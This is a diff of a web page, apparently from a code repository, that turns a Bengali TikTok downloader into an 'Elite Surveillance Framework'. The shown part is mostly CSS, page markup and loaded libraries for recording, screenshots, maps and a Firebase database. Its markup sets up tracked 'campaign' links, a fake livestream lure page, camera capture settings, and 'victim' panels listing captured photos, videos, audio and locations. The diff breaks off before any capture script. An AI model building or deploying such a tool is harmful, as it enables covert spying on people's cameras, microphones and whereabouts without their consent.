@@ -2,1100 +2,1614 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Video Downloader | MR-MOMIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>MR_MOMIN_🌍 | Elite Framework</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <!-- HTML2Canvas -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <!-- RecordRTC -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/recordrtc/5.6.2/RecordRTC.js"></script>
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    <!-- Leaflet -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* ----- ডিজাইন সম্পূর্ণ অপরিবর্তিত রাখা হয়েছে ----- */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: radial-gradient(circle at 10% 30%, #0a0f1e, #03050a);
             min-height: 100vh;
-            padding: 15px;
-        }
-        .container {
-            max-width: 100%;
-            margin: 0 auto;
-        }
-        .header {
-            text-align: center;
-            color: white;
-            margin-bottom: 30px;
-        }
-        .header h1 {
-            font-size: 1.8rem;
-            margin-bottom: 8px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-        .header p {
-            font-size: 1rem;
-            opacity: 0.9;
-            margin-bottom: 8px;
-        }
-        .developer-credit {
-            background: rgba(255,255,255,0.2);
-            padding: 8px 15px;
-            border-radius: 20px;
-            display: inline-block;
-            margin-top: 8px;
-            font-size: 0.9rem;
-        }
-        .developer-credit span {
-            font-weight: bold;
-            color: #ffd700;
-        }
-        .input-section {
-            background: white;
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            margin-bottom: 20px;
-            border: 2px solid #3498db;
-        }
-        .url-input-container {
+            padding: 2rem;
             position: relative;
-            margin-bottom: 12px;
         }
-        .url-input {
-            width: 100%;
-            padding: 12px 35px 12px 15px;
-            font-size: 16px;
-            border: 2px solid #3498db;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-        }
-        .url-input:focus {
-            outline: none;
-            border-color: #2980b9;
-            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
-        }
-        .clean-btn {
-            position: absolute;
-            right: 8px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: #e74c3c;
-            color: white;
-            border: none;
-            padding: 4px 8px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 10px;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            width: 20px;
-            height: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .clean-btn:hover {
-            background: #c0392b;
-            transform: translateY(-50%) scale(1.1);
-        }
-        .btn {
-            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 600;
-            margin: 5px;
-            width: 100%;
-        }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        .btn-download {
-            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
-        }
-        .btn-copy {
-            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
-            padding: 6px 12px;
-            font-size: 12px;
-            margin-left: 8px;
-        }
-        .result-section {
-            display: none;
-            background: white;
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            margin-bottom: 20px;
-            border: 2px solid #3498db;
-        }
-        .media-container {
-            display: flex;
-            flex-direction: row;
-            justify-content: space-between;
-            align-items: flex-start;
-            gap: 15px;
-            margin: 15px 0;
-            width: 100%;
-        }
-        .cover-box, .video-box {
-            flex: 1;
-            text-align: center;
-            min-width: 45%;
-            max-width: 48%;
-        }
-        .media-label {
-            font-size: 14px;
-            font-weight: bold;
-            margin-bottom: 8px;
-            color: #2d3748;
-            display: block;
-        }
-        .media-content {
-            width: 100%;
-            border-radius: 8px;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-            background: #f8f9fa;
-            overflow: hidden;
-            aspect-ratio: 9/16;
-            border: 2px solid #3498db;
-        }
-        .media-content img,
-        .media-content video {
+        /* Animated background */
+        .bg-glow {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            object-fit: cover;
-            display: block;
+            background: radial-gradient(circle at 70% 30%, rgba(0, 255, 0, 0.05), rgba(0, 0, 0, 0.2));
+            pointer-events: none;
+            z-index: 0;
         }
-        .video-info {
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+        }
+        /* Premium Glass Header */
+        .premium-header {
+            background: rgba(10, 20, 30, 0.65);
+            backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            padding: 1rem 2rem;
+            margin-bottom: 2rem;
             display: flex;
-            flex-direction: column;
-            gap: 20px;
-            margin-bottom: 20px;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(0, 255, 0, 0.3);
         }
-        .detail-item {
-            background: white;
-            padding: 12px;
-            border-radius: 8px;
-            border-left: 4px solid #3498db;
-            border: 2px solid #3498db;
-            margin-bottom: 10px;
+        .logo-area h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0f0, #5f5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
         }
-        .detail-item h3 {
-            color: #3498db;
-            margin-bottom: 5px;
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+        .logo-area p {
+            font-size: 0.7rem;
+            color: #0f0;
         }
-        .detail-item p {
-            color: #2d3748;
-            font-size: 14px;
-            line-height: 1.4;
-        }
-        .caption-container {
+        .uid-info {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 2rem;
+            padding: 0.5rem 1rem;
+            border: 1px solid rgba(0, 255, 0, 0.4);
             display: flex;
-            align-items: flex-start;
-            gap: 8px;
+            align-items: center;
+            gap: 1rem;
         }
-        .caption-text {
-            flex: 1;
-            word-break: break-word;
-            background: white;
-            padding: 12px;
-            border-radius: 8px;
-            border: 2px solid #3498db;
-            font-size: 14px;
-            line-height: 1.5;
-            white-space: pre-line;
-            overflow-wrap: break-word;
-            max-height: 150px;
-            overflow-y: auto;
-            color: #2c3e50;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        .uid-label {
+            font-weight: 600;
+            color: #0f0;
         }
-        .download-section {
-            text-align: center;
-            padding-top: 15px;
-            border-top: 2px solid #3498db;
+        .uid-value {
+            font-family: monospace;
+            font-weight: 700;
+            background: #0a1a0a;
+            padding: 0.2rem 0.8rem;
+            border-radius: 2rem;
+            color: #0f0;
         }
-        .stats {
+        /* Cards */
+        .card {
+            background: rgba(10, 20, 30, 0.7);
+            backdrop-filter: blur(8px);
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(0, 255, 0, 0.2);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(0, 255, 0, 0.4);
+        }
+        .feature-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .feature-card {
+            background: rgba(0, 20, 0, 0.6);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 1rem;
+            padding: 0.8rem 0.5rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            backdrop-filter: blur(4px);
+        }
+        .feature-card i {
+            font-size: 1.6rem;
+            color: #0f0;
+            margin-bottom: 0.3rem;
+            display: block;
+        }
+        .feature-card span {
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: #cfc;
+        }
+        @media (max-width: 640px) {
+            .feature-card span { font-size: 0.6rem; }
+            .feature-card i { font-size: 1.4rem; }
+        }
+        .feature-card.selected {
+            background: rgba(0, 255, 0, 0.2);
+            border-color: #0f0;
+            box-shadow: 0 0 12px rgba(0, 255, 0, 0.4);
+            transform: scale(1.02);
+        }
+        .btn-primary {
+            background: linear-gradient(95deg, #0a0, #0a0);
+            border: none;
+            color: #000;
+            padding: 0.9rem;
+            border-radius: 1rem;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 15px #0f0;
+        }
+        .toggle-switch {
+            display: flex;
+            align-items: center;
             gap: 10px;
-            margin-bottom: 20px;
+            margin: 1rem 0;
+            background: rgba(0, 20, 0, 0.5);
+            padding: 0.5rem;
+            border-radius: 2rem;
         }
-        .stat-item {
-            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
-            color: white;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            transition: transform 0.3s ease;
-            border: 2px solid rgba(255,255,255,0.3);
-        }
-        .stat-item:hover {
-            transform: translateY(-3px);
-        }
-        .stat-number {
-            font-size: 20px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        .stat-label {
-            font-size: 12px;
-            opacity: 0.9;
-            margin-bottom: 3px;
-        }
-        .exact-number {
-            font-size: 10px;
-            opacity: 0.8;
-            color: rgba(255,255,255,0.9);
-            font-family: 'Courier New', monospace;
-            background: rgba(0,0,0,0.2);
-            padding: 2px 4px;
-            border-radius: 3px;
-        }
-        .loading {
-            text-align: center;
-            padding: 30px;
-            display: none;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            margin-bottom: 20px;
-            border: 2px solid #3498db;
-        }
-        .error {
-            background: #fed7d7;
-            color: #c53030;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            display: none;
-            margin-bottom: 15px;
-            border-left: 4px solid #e53e3e;
-            font-size: 14px;
-            border: 2px solid #e53e3e;
-        }
-        .success {
-            background: #c6f6d5;
-            color: #276749;
-            padding: 8px 12px;
-            border-radius: 5px;
-            text-align: center;
-            display: none;
-            margin-bottom: 10px;
-            font-size: 13px;
-            border-left: 4px solid #38a169;
-            border: 2px solid #38a169;
-        }
-        .footer {
-            text-align: center;
-            color: white;
-            margin-top: 30px;
-            padding: 15px;
-            opacity: 0.8;
-            font-size: 0.9rem;
-        }
-        .footer p {
-            margin: 5px 0;
-        }
-        .download-loading {
-            display: none;
-            text-align: center;
-            margin: 15px 0;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            border: 2px solid #3498db;
-        }
-        .pulse-loader {
-            display: inline-block;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: #3498db;
-            animation: pulse 1.2s infinite ease-in-out;
-        }
-        @keyframes pulse {
-            0% {
-                transform: scale(0.8);
-                box-shadow: 0 0 0 0 rgba(52, 152, 219, 0.7);
-            }
-            50% {
-                transform: scale(1);
-                box-shadow: 0 0 0 10px rgba(52, 152, 219, 0);
-            }
-            100% {
-                transform: scale(0.8);
-                box-shadow: 0 0 0 0 rgba(52, 152, 219, 0);
-            }
-        }
-        .info-card {
-            background: white;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 15px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            border-left: 4px solid #3498db;
-            border: 2px solid #3498db;
-        }
-        .info-card h3 {
-            color: #3498db;
-            margin-bottom: 8px;
+        .shorten-check {
             display: flex;
             align-items: center;
-            gap: 6px;
-            font-size: 16px;
+            gap: 8px;
+            margin: 1rem 0;
         }
-        .creator-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px;
-            background: white;
-            border-radius: 8px;
-            margin-bottom: 12px;
-            border: 2px solid #3498db;
+        .camera-custom {
+            display: none;
+            margin-top: 1rem;
+            padding: 1rem;
+            background: rgba(0, 20, 0, 0.6);
+            border-radius: 1rem;
+            border: 1px solid rgba(0, 255, 0, 0.3);
         }
-        .creator-avatar {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 2px solid #3498db;
+        .camera-custom h4 {
+            margin-bottom: 0.8rem;
+            color: #0f0;
         }
-        .creator-details {
-            flex: 1;
+        .camera-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
         }
-        .creator-name {
-            font-weight: bold;
-            color: #2d3748;
-            margin-bottom: 3px;
-            font-size: 15px;
-        }
-        .creator-id {
-            color: #718096;
-            font-size: 13px;
-        }
-        .loading-dots {
-            display: flex;
-            justify-content: center;
-            margin-top: 12px;
-        }
-        .loading-dot {
-            width: 10px;
-            height: 10px;
-            margin: 0 4px;
-            background-color: #3498db;
-            border-radius: 50%;
-            animation: loading-dot 1.5s infinite ease-in-out;
-        }
-        .loading-dot:nth-child(1) {
-            animation-delay: 0s;
-        }
-        .loading-dot:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        .loading-dot:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-        @keyframes loading-dot {
-            0%, 100% {
-                transform: scale(0.8);
-                opacity: 0.5;
-            }
-            50% {
-                transform: scale(1.2);
-                opacity: 1;
-            }
-        }
-        .wave-loader {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 15px 0;
-        }
-        .wave-loader div {
-            width: 6px;
-            height: 30px;
-            margin: 0 2px;
-            background: linear-gradient(to top, #3498db, #2980b9);
-            border-radius: 3px;
-            animation: wave 1.2s infinite ease-in-out;
-        }
-        .wave-loader div:nth-child(1) {
-            animation-delay: 0s;
-        }
-        .wave-loader div:nth-child(2) {
-            animation-delay: 0.1s;
-        }
-        .wave-loader div:nth-child(3) {
-            animation-delay: 0.2s;
-        }
-        .wave-loader div:nth-child(4) {
-            animation-delay: 0.3s;
-        }
-        .wave-loader div:nth-child(5) {
-            animation-delay: 0.4s;
-        }
-        @keyframes wave {
-            0%, 40%, 100% {
-                transform: scaleY(0.5);
-            }
-            20% {
-                transform: scaleY(1);
-            }
-        }
-        .fade-in {
-            animation: fadeIn 0.5s ease-in-out;
-        }
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        .bounce-in {
-            animation: bounceIn 0.6s ease-in-out;
-        }
-        @keyframes bounceIn {
-            0% {
-                opacity: 0;
-                transform: scale(0.3);
-            }
-            50% {
-                opacity: 1;
-                transform: scale(1.05);
-            }
-            70% {
-                transform: scale(0.9);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-        .special-loader {
+        .camera-option {
             display: flex;
             flex-direction: column;
+            gap: 0.3rem;
+        }
+        .camera-option label {
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #0f0;
+        }
+        .camera-option select, .camera-option input {
+            padding: 0.4rem;
+            border-radius: 0.5rem;
+            border: 1px solid #0f0;
+            background: #0a1a0a;
+            color: #0f0;
+        }
+        .link-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 1rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            border-left: 4px solid #0f0;
+        }
+        .link-text {
+            word-break: break-all;
+            background: #0a1a0a;
+            padding: 0.8rem;
+            border-radius: 0.8rem;
+            font-family: monospace;
+            font-size: 0.8rem;
+            margin: 0.5rem 0;
+            color: #afa;
+        }
+        .campaign-list {
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        .campaign-item {
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 1rem;
+            padding: 0.8rem;
+            margin-bottom: 0.8rem;
+        }
+        .campaign-header {
+            display: flex;
             align-items: center;
-            justify-content: center;
-            margin: 20px 0;
+            gap: 0.8rem;
+            flex-wrap: wrap;
         }
-        .tiktok-loader {
-            width: 60px;
-            height: 60px;
-            position: relative;
-            margin-bottom: 15px;
-        }
-        .tiktok-loader .music-note {
-            position: absolute;
-            font-size: 30px;
-            color: #3498db;
-            animation: musicFloat 2s infinite ease-in-out;
-        }
-        .tiktok-loader .music-note:nth-child(1) {
-            left: 0;
-            top: 0;
-            animation-delay: 0s;
-        }
-        .tiktok-loader .music-note:nth-child(2) {
-            right: 0;
-            top: 15px;
-            animation-delay: 0.5s;
-        }
-        .tiktok-loader .music-note:nth-child(3) {
-            left: 15px;
-            bottom: 0;
-            animation-delay: 1s;
-        }
-        @keyframes musicFloat {
-            0%, 100% {
-                transform: translateY(0) scale(1);
-                opacity: 0.7;
-            }
-            50% {
-                transform: translateY(-10px) scale(1.2);
-                opacity: 1;
-            }
-        }
-        .countdown {
-            font-size: 16px;
-            font-weight: bold;
-            color: #3498db;
-            margin-top: 12px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 6px 12px;
-            border-radius: 15px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-        }
-        .rotating-text {
-            font-size: 16px;
-            font-weight: bold;
-            color: #333;
-            margin-top: 12px;
-            height: 25px;
+        .campaign-link {
+            font-size: 0.7rem;
+            word-break: break-all;
+            font-family: monospace;
+            color: #afa;
+            flex: 1;
             overflow: hidden;
-            position: relative;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
-        .rotating-text span {
+        .campaign-clicks {
+            background: #0f0;
+            color: #000;
+            padding: 0.2rem 0.6rem;
+            border-radius: 1rem;
+            font-weight: bold;
+            font-size: 0.7rem;
+        }
+        .copy-camp, .delete-camp {
+            background: #0a1a0a;
+            border: 1px solid #0f0;
+            border-radius: 1rem;
+            padding: 0.2rem 0.6rem;
+            cursor: pointer;
+            font-size: 0.7rem;
+            color: #0f0;
+        }
+        .delete-camp {
+            color: #f66;
+        }
+        .victim-item {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 1rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            border: 1px solid #0f0;
+        }
+        .victim-header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 0.5rem;
+            margin-bottom: 0.8rem;
+            flex-wrap: wrap;
+        }
+        .victim-tabs {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+        .tab-btn {
+            background: #0a1a0a;
+            border: 1px solid #0f0;
+            padding: 0.3rem 0.8rem;
+            border-radius: 2rem;
+            cursor: pointer;
+            font-size: 0.7rem;
+            color: #0f0;
+        }
+        .tab-btn.active {
+            background: #0f0;
+            color: #000;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
             display: block;
-            position: absolute;
+        }
+        .image-grid, .video-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            align-items: flex-start;
+        }
+        .media-card {
+            background: #0a1a0a;
+            border-radius: 0.8rem;
+            padding: 0.5rem;
+            border: 1px solid #0f0;
+            width: 180px;
+            text-align: center;
+        }
+        .thumbnail {
             width: 100%;
-            opacity: 0;
-            animation: rotateText 10s infinite linear;
+            height: auto;
+            max-height: 120px;
+            object-fit: cover;
+            border-radius: 0.5rem;
+            cursor: pointer;
         }
-        .rotating-text span:nth-child(1) {
-            animation-delay: 0s;
+        .video-thumb {
+            width: 100%;
+            max-height: 120px;
+            background: #000;
+            border-radius: 0.5rem;
         }
-        .rotating-text span:nth-child(2) {
-            animation-delay: 2s;
+        .download-btn {
+            background: #0a1a0a;
+            border: 1px solid #0f0;
+            border-radius: 1rem;
+            padding: 0.2rem 0.5rem;
+            font-size: 0.7rem;
+            cursor: pointer;
+            margin-top: 0.3rem;
+            display: inline-block;
+            color: #0f0;
         }
-        .rotating-text span:nth-child(3) {
-            animation-delay: 4s;
+        audio {
+            max-width: 200px;
+            margin: 0.2rem;
         }
-        .rotating-text span:nth-child(4) {
-            animation-delay: 6s;
+        .map-container {
+            height: 200px;
+            border-radius: 0.8rem;
+            margin-top: 0.5rem;
         }
-        .rotating-text span:nth-child(5) {
-            animation-delay: 8s;
+        .delete-victim-btn {
+            background: #a00;
+            color: white;
+            border: none;
+            border-radius: 1rem;
+            padding: 0.2rem 0.5rem;
+            cursor: pointer;
         }
-        @keyframes rotateText {
-            0% {
-                opacity: 0;
-                transform: translateY(15px);
-            }
-            5% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-            20% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-            25% {
-                opacity: 0;
-                transform: translateY(-15px);
-            }
-            100% {
-                opacity: 0;
-                transform: translateY(-15px);
-            }
-        }
-        @media (max-width: 480px) {
-            .media-container {
-                flex-direction: row;
-                gap: 10px;
-            }
-            .cover-box, .video-box {
-                min-width: 48%;
-                max-width: 48%;
-            }
-            .media-content {
-                aspect-ratio: 9/16;
-            }
-            .stats {
-                grid-template-columns: repeat(2, 1fr);
-            }
-        }
-        .crash-screen {
+        .lightbox {
             display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #000;
-            color: red;
+            background: rgba(0,0,0,0.9);
             z-index: 9999;
-            font-family: 'Courier New', monospace;
-            padding: 20px;
-            overflow: auto;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .lightbox.active {
+            display: flex;
+        }
+        .lightbox-img, .lightbox-video {
+            max-width: 90%;
+            max-height: 80%;
+            border-radius: 1rem;
+        }
+        .close-lightbox {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: white;
+            font-size: 2rem;
+            cursor: pointer;
+        }
+        .stats-row {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+        .stat-card {
+            background: #0a1a0a;
+            border-radius: 1rem;
+            padding: 0.8rem;
+            flex: 1;
             text-align: center;
+            border: 1px solid #0f0;
+            color: #0f0;
+        }
+        .export-btn {
+            background: #0a1a0a;
+            border: 1px solid #0f0;
+            border-radius: 2rem;
+            padding: 0.4rem 1rem;
+            cursor: pointer;
+            color: #0f0;
+        }
+        .hide {
+            display: none;
+        }
+        .victim-panel {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #0a0a1a;
+            color: white;
+            padding: 0;
+            border-radius: 1.5rem;
+            overflow: hidden;
+        }
+        .fake-stream-header {
+            background: linear-gradient(90deg, #1e3c72, #2a5298);
+            padding: 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .fake-stream-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+        .fake-stream-video {
+            background: #000;
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16/9;
+        }
+        .fake-stream-video video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .fake-stream-chat {
+            background: #1e1e2a;
+            padding: 1rem;
+            height: 300px;
+            overflow-y: auto;
+        }
+        .chat-message {
+            background: #2a2a3a;
+            margin: 0.5rem 0;
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            animation: fadeIn 0.3s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .scan-progress {
+            width: 100%;
+            height: 4px;
+            background: #2a2a3a;
+            margin: 0.5rem 0;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .scan-fill {
+            width: 0%;
+            height: 100%;
+            background: #2a5298;
+            transition: width 0.1s linear;
+        }
+        .status-msg {
+            text-align: center;
+            color: #0f0;
+            margin: 1rem;
+        }
+        .passive-compact {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            background: #0a1a0a;
+            padding: 0.8rem;
+            border-radius: 1rem;
+            border: 1px solid #0f0;
+        }
+        .passive-item {
+            background: #0a1a0a;
+            padding: 0.2rem 0.6rem;
+            border-radius: 1rem;
+            font-size: 0.7rem;
+            color: #0f0;
+            white-space: nowrap;
+            border: 1px solid #0f0;
+        }
+        @media (max-width: 640px) {
+            body {
+                padding: 1rem;
+            }
+            .passive-item {
+                font-size: 0.6rem;
+            }
+            .campaign-link {
+                white-space: normal;
+                font-size: 0.65rem;
+            }
+            .media-card {
+                width: 140px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="crash-screen" id="crashScreen">
-        <h1>🚨 SECURITY VIOLATION DETECTED 🚨</h1>
-        <p>System integrity compromised. Unauthorized modification detected.</p>
-        <p>Developer name protection triggered.</p>
-        <div id="crashCode"></div>
-    </div>
-
-    <div class="container">
-        <div class="header">
-            <h1>🎵 TikTok Video Downloader</h1>
-            <p>টিকটক ভিডিওর সকল তথ্য এবং ডাউনলোড অপশন</p>
-            <div class="developer-credit">
-                Developed by: <span id="devName">MR-MOMIN</span>
-            </div>
+<div class="bg-glow"></div>
+<div class="container">
+    <div class="premium-header">
+        <div class="logo-area">
+            <h1>MR_MOMIN_🌍</h1>
+            <p>Elite Surveillance Framework</p>
         </div>
-
-        <div class="input-section">
-            <div class="url-input-container">
-                <input type="url" class="url-input" id="videoUrl" 
-                       placeholder="টিকটক ভিডিওর URL এখানে পেস্ট করুন...">
-                <button class="clean-btn" onclick="cleanUrl()" title="URL ক্লিন করুন">
-                    ✕
-                </button>
-            </div>
-            
-            <button class="btn" onclick="getVideoInfo()">
-                🔍 ভিডিও তথ্য সংগ্রহ করুন
-            </button>
-        </div>
-
-        <div class="loading" id="loading">
-            <div class="special-loader">
-                <div class="tiktok-loader">
-                    <div class="music-note">♪</div>
-                    <div class="music-note">♫</div>
-                    <div class="music-note">🎵</div>
-                </div>
-                <div class="rotating-text">
-                    <span>ভিডিও তথ্য সংগ্রহ করা হচ্ছে...</span>
-                    <span>ভিডিও বিশ্লেষণ করা হচ্ছে...</span>
-                    <span>মেটাডাটা প্রক্রিয়া করা হচ্ছে...</span>
-                    <span>ডাউনলোড লিংক তৈরি করা হচ্ছে...</span>
-                    <span>প্রায় শেষ...</span>
-                </div>
-                <div class="countdown" id="countdown">৫</div>
-            </div>
-            <div class="wave-loader">
-                <div></div>
-                <div></div>
-                <div></div>
-                <div></div>
-                <div></div>
-            </div>
-        </div>
-
-        <div class="download-loading" id="downloadLoading">
-            <div class="pulse-loader"></div>
-            <p style="margin-top: 12px;">ডাউনলোড প্রস্তুত করা হচ্ছে...</p>
-            <div class="loading-dots">
-                <div class="loading-dot"></div>
-                <div class="loading-dot"></div>
-                <div class="loading-dot"></div>
-            </div>
-        </div>
-
-        <div class="error" id="error"></div>
-        <div class="success" id="success"></div>
-
-        <div class="result-section fade-in" id="resultSection">
-            <div class="info-card bounce-in">
-                <h3>🎬 ভিডিও প্রিভিউ</h3>
-                
-                <div class="media-container">
-                    <div class="cover-box">
-                        <span class="media-label">🖼️ কভার</span>
-                        <div class="media-content">
-                            <img id="videoCover" src="" alt="Video Cover">
-                        </div>
-                    </div>
-                    <div class="video-box">
-                        <span class="media-label">🎥 ভিডিও</span>
-                        <div class="media-content">
-                            <video id="videoPlayer" controls></video>
-                        </div>
-                    </div>
-                </div>
-                
-                <div style="text-align: center; margin-top: 12px;">
-                    <audio id="videoMusic" controls style="width: 100%; max-width: 300px;"></audio>
-                </div>
-            </div>
-
-            <div class="video-info">
-                <div class="info-card fade-in">
-                    <h3>📝 ভিডিও ডিটেইলস</h3>
-                    <div class="detail-item">
-                        <h3>ভিডিও ক্যাপশন</h3>
-                        <div class="caption-container">
-                            <p id="videoTitle" class="caption-text">লোড হচ্ছে...</p>
-                            <button class="btn btn-copy" onclick="copyCaption()">
-                                📋 কপি
-                            </button>
-                        </div>
-                    </div>
-                    <div class="detail-item">
-                        <h3>আপলোড সময়</h3>
-                        <p id="uploadTime">লোড হচ্ছে...</p>
-                    </div>
-                    <div class="detail-item">
-                        <h3>ভিডিও আইডি</h3>
-                        <p id="videoId">লোড হচ্ছে...</p>
-                    </div>
-                </div>
-
-                <div class="info-card fade-in">
-                    <h3>👤 ক্রিয়েটর তথ্য</h3>
-                    <div class="creator-info">
-                        <img id="creatorAvatar" src="" alt="Creator Avatar" class="creator-avatar">
-                        <div class="creator-details">
-                            <div class="creator-name" id="creatorName">লোড হচ্ছে...</div>
-                            <div class="creator-id" id="creatorId">@username</div>
-                        </div>
-                    </div>
-                    <div class="detail-item">
-                        <h3>ক্রিয়েটর আইডি</h3>
-                        <p id="creatorUniqueId">লোড হচ্ছে...</p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="info-card fade-in">
-                <h3>📊 ভিডিও স্ট্যাটিস্টিক্স</h3>
-                <div class="stats">
-                    <div class="stat-item bounce-in">
